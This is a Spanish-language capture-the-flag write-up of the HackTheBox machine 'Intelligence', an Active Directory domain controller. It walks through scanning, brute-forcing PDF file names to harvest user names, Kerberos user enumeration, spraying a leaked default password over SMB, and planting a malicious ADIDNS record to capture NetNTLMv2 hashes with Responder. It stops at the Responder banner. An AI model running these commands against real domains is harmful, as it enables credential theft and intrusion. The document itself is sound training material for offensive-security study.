---
layout: post
title: Intelligence
date: 2023-01-23
description: 
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Intelligence-htb/Intelligence_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Information Leakage

* Enumeración de Kerberos

* Creación de un DNS Record

* Abuso ADIDNS

* Enumeración con BloodHound

* Abuso del Privilegio ReadGMSAPassword Rights

* Abuso del Privilegio Unconstrained Delegation

* Abuso del Privilegio AllowedToDelegateRights (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.10.248 -oG openports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 13:10 GMT
Initiating SYN Stealth Scan at 13:10
Scanning 10.10.10.248 [65535 ports]
Discovered open port 49714/tcp on 10.10.10.248
Discovered open port 49691/tcp on 10.10.10.248
Discovered open port 51476/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 0 to 5 due to 11 out of 17 dropped probes since last increase.
Discovered open port 49666/tcp on 10.10.10.248
SYN Stealth Scan Timing: About 47.33% done; ETC: 13:11 (0:00:35 remaining)
Discovered open port 389/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 80/tcp on 10.10.10.248
Discovered open port 135/tcp on 10.10.10.248
Discovered open port 445/tcp on 10.10.10.248
Discovered open port 139/tcp on 10.10.10.248
Discovered open port 53/tcp on 10.10.10.248
Discovered open port 593/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 10 to 20 due to 11 out of 14 dropped probes since last increase.
Discovered open port 49705/tcp on 10.10.10.248
Discovered open port 9389/tcp on 10.10.10.248
Discovered open port 3268/tcp on 10.10.10.248
Discovered open port 49692/tcp on 10.10.10.248
Discovered open port 3269/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 20 to 40 due to 11 out of 20 dropped probes since last increase.
Discovered open port 636/tcp on 10.10.10.248
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.10.248, 16) => Operation not permitted
Offending packet: TCP 10.10.16.6:34207 > 10.10.10.248:26456 S ttl=37 id=16056 iplen=44  seq=962530816 win=1024 <mss 1460>
Discovered open port 464/tcp on 10.10.10.248
Discovered open port 5985/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 40 to 80 due to max_successful_tryno increase to 5
Completed SYN Stealth Scan at 13:11, 92.55s elapsed (65535 total ports)
Nmap scan report for 10.10.10.248
Host is up, received user-set (0.15s latency).
Scanned at 2023-01-23 13:10:09 GMT for 93s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49705/tcp open  unknown          syn-ack ttl 127
49714/tcp open  unknown          syn-ack ttl 127
51476/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 92.66 seconds
           Raw packets sent: 458738 (20.184MB) | Rcvd: 46 (2.024KB)
```

### Escaneo de Servicios y Versiones de cada puerto

```null
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.10.248 -oG openports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 13:10 GMT
Initiating SYN Stealth Scan at 13:10
Scanning 10.10.10.248 [65535 ports]
Discovered open port 49714/tcp on 10.10.10.248
Discovered open port 49691/tcp on 10.10.10.248
Discovered open port 51476/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 0 to 5 due to 11 out of 17 dropped probes since last increase.
Discovered open port 49666/tcp on 10.10.10.248
SYN Stealth Scan Timing: About 47.33% done; ETC: 13:11 (0:00:35 remaining)
Discovered open port 389/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 80/tcp on 10.10.10.248
Discovered open port 135/tcp on 10.10.10.248
Discovered open port 445/tcp on 10.10.10.248
Discovered open port 139/tcp on 10.10.10.248
Discovered open port 53/tcp on 10.10.10.248
Discovered open port 593/tcp on 10.10.10.248
Increasing send delay for 10.10.10.248 from 10 to 20 due to 11 out of 14 dropped probes since last increase.
Discovered open port 49705/tcp on 10.10.10.248
Discovered open port 9389/tcp on 10.10.10.248
❯ nmap -sCV -p53,80,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49691,49692,49705,49714,51476 10.10.10.248 -Pn -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 13:12 GMT
Nmap scan report for 10.10.10.248
Host is up (0.60s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain?
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap
|_ssl-date: 2023-01-23T20:13:59+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2023-01-23T20:13:59+00:00; +6h59m58s from scanner time.
3268/tcp  open  ldap
|_ssl-date: 2023-01-23T20:14:00+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2023-01-23T20:13:59+00:00; +6h59m58s from scanner time.
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  unknown
49691/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49692/tcp open  unknown
49705/tcp open  unknown
49714/tcp open  unknown
51476/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-23T20:13:11
|_  start_date: N/A
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.17 seconds
```

En base a los CN, se puede ver el dominio intelligence.htb y el subdominio dc.intelligence.htb

Los añado al /etc/hosts

```null
echo '10.10.10.248 intelligence.htb dc.intelligence.htb' >> /etc/hosts
```

## Puerto 88 (KERBEROS) | Puerto 445 (SMB)

Con crackmapexec me conecto a la máquina víctima para identificar el dominio, hostname, y versiones

```null
crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

Enumero los recursos compartidos

```null
smbmap -H 10.10.10.248 -u 'null'
[!] Authentication error on 10.10.10.248
```

Tengo que disponer de credenciales

## Puerto 80 (HTTP)

Con whatweb, analizo las tecnologías que se están empleando

```null
whatweb http://10.10.10.248
http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]
```

En la página principal aparece lo siguiente:

<img src="/writeups/assets/img/Intelligence-htb/1.png" alt="">

Existe un campo que permite descargar un PDF

<img src="/writeups/assets/img/Intelligence-htb/2.png" alt="">

El nombre del archivo tiene una estructura de fecha seguido de upload.pdf, por lo que se podría tratar de aplicar fuerza bruta para descargar todos los que existan

<img src="/writeups/assets/img/Intelligence-htb/3.png" alt="">

En los metadatos del archivo, se puede ver un campo Creator, que corresponde al usuario

Para aplicar fuzzing, creo un script en bash

```null
#!/bin/bash

for a in {2020..2022}; do
  for x in {01..31}; do
    for i in {01..12}; do
        echo "http://10.10.10.248/documents/$a-$i-$x-upload.pdf" &
    done
  done
done
```

Además, añado hilos con xargs para ir mucho más rápido

```null
./fuzzer.sh | xargs -n 1 -P 50 wget &>/dev/null
```

Guardo todos los usuarios en un diccionario y los valido por kerberos

```null
exiftool -Creator 2* | grep : | awk 'NF{print $NF}' | sort -u > users
```

Para ello, utilizo kerbrute

```null
kerbrute userenum -d intelligence.htb --dc 10.10.10.248 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/23/23 - Ronnie Flathers @ropnop

2023/01/23 13:53:14 >  Using KDC(s):
2023/01/23 13:53:14 >  	10.10.10.248:88

2023/01/23 13:53:14 >  [+] VALID USERNAME:	Darryl.Harris@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Anita.Roberts@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	David.Wilson@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Brian.Baker@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Ian.Duncan@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	David.Mcbride@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Daniel.Shelton@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Brian.Morris@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Danny.Matthews@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	David.Reed@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Jason.Patterson@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Jessica.Moody@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Jennifer.Thomas@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	Jason.Wright@intelligence.htb
2023/01/23 13:53:14 >  [+] VALID USERNAME:	John.Coleman@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Nicole.Brock@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Kaitlyn.Zimmerman@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Samuel.Richardson@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Jose.Williams@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Kelly.Long@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Richard.Williams@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Stephanie.Young@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Thomas.Hall@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Scott.Scott@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Teresa.Williamson@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Thomas.Valenzuela@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Travis.Evans@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Veronica.Patel@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	Tiffany.Molina@intelligence.htb
2023/01/23 13:53:21 >  [+] VALID USERNAME:	William.Lee@intelligence.htb
2023/01/23 13:53:21 >  Done! Tested 30 usernames (30 valid) in 6.885 seconds
```

Todos son válidos. Podría probar a efectuar un ASPRepRoasting, que se puede dar si un usuario no requiere de autenticación previa de kerberos

```null
GetNPUsers.py intelligence.htb/ -no-pass -usersfile users
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Para ninguno aplica, por tanto no puedo obtener un TGT para crackearlo por fuerza bruta

Podría ver lo que hay en cada PDF, pero al ser demasiados, conviene convertirlos a documentos txt y filtrar por consola por lo que me interesa

Para ello utilizo una herramienta que se encuentra llamada PDF2text

```null
pip3 install pdftotext
for i in $(ls | grep pdf); do pdftotext $i; done
```

En uno de ellos, aparecen credenciales en texto claro

```null
       │ File: 2020-06-04-upload.txt
───────┼──────────────────────────────────────────────────
   1   │ New Account Guide
   2   │ Welcome to Intelligence Corp!
   3   │ Please login using your username and the default password of:
   4   │ NewIntelligenceCorpUser9876
   5   │ After logging in please change your password as soon as possible.
   6   │ 
   7   │ ^L
```

Para saber a quien pertenece esa contraseña, puedo aplicar fuerza bruta por SMB

```null
crackmapexec smb 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_USER_SESSION_DELETED 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

Para el usuario Tiffany.Molina, la contraseña es válida

Guardo las credenciales en un archivo

```null
echo 'Tiffany.Molina:NewIntelligenceCorpUser9876' > credentials.txt
```

Si pertenece al grupo Remote Management Users me podré conectar por winrm

```null
crackmapexec winrm 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
SMB         10.10.10.248    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
HTTP        10.10.10.248    5985   DC               [*] http://10.10.10.248:5985/wsman
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```


Como no me puedo loggear, pruebo a aplicar un Kerberoasting Attack y extraer el TGS de otro usuario para crackearlo por fuerza bruta

```null
GetUserSPNs.py intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

No entries found!
```

No encuentra nada

## Puerto 389 (LDAP)

Si me conecto al servicio LDAP, puedo tratar de dumpear data que contenga información sobre los usuarios y el grupo al que pertenecen

```null
ldapdomaindump -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.10.10.248
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Me monto un servicio http con python para verlo de forma gráfica desde el navegador web

```null
python3 -m http.server 80
```

Pero no hay nada que pueda utilizar por ahora

## Puerto 445 (SMB)

Vuelvo a enumerar recursos compartidos a nivel de red, pero esta vez autenticado

```null
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY       
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   READ ONLY      
```

Me dirijo al directorio Users

```null
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r 'Users'
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY       
        .\Users\*
        dw--w--w--                0 Mon Apr 19 01:20:26 2021    .
        dw--w--w--                0 Mon Apr 19 01:20:26 2021    ..
        dr--r--r--                0 Mon Apr 19 00:18:39 2021    Administrator
        dr--r--r--                0 Mon Apr 19 03:16:30 2021    All Users
        dw--w--w--                0 Mon Apr 19 02:17:40 2021    Default
        dr--r--r--                0 Mon Apr 19 03:16:30 2021    Default User
        fr--r--r--              174 Mon Apr 19 03:15:17 2021    desktop.ini
        dw--w--w--                0 Mon Apr 19 00:18:39 2021    Public
        dr--r--r--                0 Mon Apr 19 01:20:26 2021    Ted.Graves
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Tiffany.Molina
```

Luego a su directorio personal

```null
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r 'Users/Tiffany.Molina'
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY       
        .\UsersTiffany.Molina\*
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    .
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    ..
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    AppData
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Application Data
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Cookies
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    Desktop
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    Documents
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    Downloads
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    Favorites
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    Links
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Local Settings
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    Music
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    My Documents
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    NetHood
        fr--r--r--           131072 Mon Apr 19 00:51:46 2021    NTUSER.DAT
        fr--r--r--            86016 Mon Apr 19 00:51:46 2021    ntuser.dat.LOG1
        fr--r--r--                0 Mon Apr 19 00:51:46 2021    ntuser.dat.LOG2
        fr--r--r--            65536 Mon Apr 19 00:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf
        fr--r--r--           524288 Mon Apr 19 00:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
        fr--r--r--           524288 Mon Apr 19 00:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
        fr--r--r--               20 Mon Apr 19 00:51:46 2021    ntuser.ini
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    Pictures
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Recent
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Saved Games
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    SendTo
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Start Menu
        dr--r--r--                0 Mon Apr 19 00:51:46 2021    Templates
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    articulos
```

En el escritorio está la primera flag

```null
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r 'Users/Tiffany.Molina/Desktop'
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY       
        .\UsersTiffany.Molina\Desktop\*
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    .
        dw--w--w--                0 Mon Apr 19 00:51:46 2021    ..
        fw--w--w--               34 Mon Jan 23 21:40:37 2023    user.txt

smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download 'Users/Tiffany.Molina/Desktop/user.txt'
[+] Starting download: Users\Tiffany.Molina\Desktop\user.txt (34 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Intelligence/ld/10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt

cat /home/rubbx/Desktop/HTB/Machines/Intelligence/ld/10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt
f32439b5e4d8b3b94f700876334a5454
```

Dentro del directorio IT tengo capacidad de lectura

```null
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r 'IT'
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IT                                                      READ ONLY       
        .\IT\*
        dr--r--r--                0 Mon Apr 19 00:50:58 2021    .
        dr--r--r--                0 Mon Apr 19 00:50:58 2021    ..
        fr--r--r--             1046 Mon Apr 19 00:50:58 2021    downdetector.ps1
```

Me descargo el script en powershell

```null
smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download 'IT/downdetector.ps1'
[+] Starting download: IT\downdetector.ps1 (1046 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Intelligence/ld/10.10.10.248-IT_downdetector.ps1

mv /home/rubbx/Desktop/HTB/Machines/Intelligence/ld/10.10.10.248-IT_downdetector.ps1 downdetector.ps1
```

Su contenido es el siguiente:

```null
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

No puedo modificarlo, pero si tratar de aprovecharme de los DNS record para tratar de crear uno mío propio. Como itera por cada uno que empiece por la palabra web, si consigo inyectar un DNS record, la autenticación vendrá a mi lado y podré tratar de interceptar un hash NetNTLMv2

Descargo DNStool, perteneciente a la suite de krbrelayx

```null
git clone https://github.com/dirkjanm/krbrelayx
```

Para utilizarlo, basta con proporcionarle las credenciales, introducir el nombre del DNS record, el método (en este caso añadir) e indicar a donde debe apuntar (mi IP)

```null
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webrubbx -a add -t A -d 10.10.16.6 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Si me quedo en escucha con Responder, intercepto el hash

```null
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

